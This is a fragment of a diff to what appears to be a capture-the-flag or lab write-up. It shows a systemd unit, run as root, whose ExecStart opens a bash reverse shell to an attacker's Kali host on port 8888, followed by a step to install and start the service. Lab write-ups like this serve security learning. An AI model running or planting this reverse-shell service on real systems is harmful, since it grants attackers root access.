@@ -146,7 +146,7 @@ User=root
 ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<kali ip>/8888 0>&1'
 
 [Install]
-wantedBy=multi-user.target ^D
+wantedBy=multi-user.target (Press CTRL+D to save file)
 ```
 
 Put file *root.service* to machine, then create symlink and start service.
